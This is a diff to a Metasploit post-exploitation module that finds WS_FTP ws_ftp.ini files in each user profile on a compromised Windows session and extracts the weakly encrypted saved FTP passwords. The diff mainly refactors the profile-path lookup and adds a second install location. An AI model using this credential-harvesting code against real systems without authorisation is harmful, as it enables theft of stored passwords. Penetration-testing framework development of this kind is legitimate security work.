@@ -11,16 +11,21 @@ require 'msf/core'
 require 'rex'
 require 'rex/parser/ini'
 require 'msf/core/post/windows/registry'
+require 'msf/core/post/windows/user_profiles'
+
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Windows Gather WS_FTP Saved Password Extraction',
-				'Description'   => %q{ This module extracts weakly encrypted saved FTP Passwords 
-					from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file. },
+				'Description'   => %q{
+					This module extracts weakly encrypted saved FTP Passwords
+					from WS_FTP. It finds saved FTP connections in the ws_ftp.ini file.
+				},
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'TheLightCosine <thelightcosine[at]gmail.com>'],
 				'Version'       => '$Revision$',
@@ -31,41 +36,27 @@ class Metasploit3 < Msf::Post
 
 	def run
 		print_status("Checking Default Locations...")
-		os = session.sys.config.sysinfo['OS']
-		drive = session.fs.file.expand_path("%SystemDrive%")
-
-		if os =~ /Windows 7|Vista|2008/
-			@appdata = '\\AppData\\Roaming\\'
-			@users = drive + '\\Users'
-		else
-			@appdata = '\\Application Data\\'
-			@users = drive + '\\Documents and Settings'
+		grab_user_profiles().each do |user|
+			next if user['AppData'] == nil
+			check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini")
+			check_appdata(user['AppData'] + "\\Ipswitch\\WS_FTP Home\\Sites\\ws_ftp.ini")
 		end
-
-		get_users
-		@userpaths.each do |path|
-			check_appdata(path)
-		end
+	
+		
 	end
 
 	def check_appdata(path)
-		filename = "#{path}#{@appdata}\\Ipswitch\\WS_FTP\\Sites\\ws_ftp.ini"
+		
 		begin
-			iniexists = client.fs.file.stat(filename)
-			print_status("Found File at #{filename}")
-			get_ini(filename)
+			client.fs.file.stat(path)
+			print_status("Found File at #{path}")
+			get_ini(path)
 		rescue
-			print_status("#{filename} not found ....")
+			print_status("#{path} not found ....")
 		end
 	end
 
-	def get_users
-		@userpaths = []
-		session.fs.dir.foreach(@users) do |path|
-			next if path =~ /^(\.|\.\.|All Users|Default|Default User|Public|desktop.ini|LocalService|NetworkService)$/
-			@userpaths << "#{@users}\\#{path}\\"
-		end
-	end
+	
 
 	def get_ini(filename)
 		config = client.fs.file.new(filename, 'r')
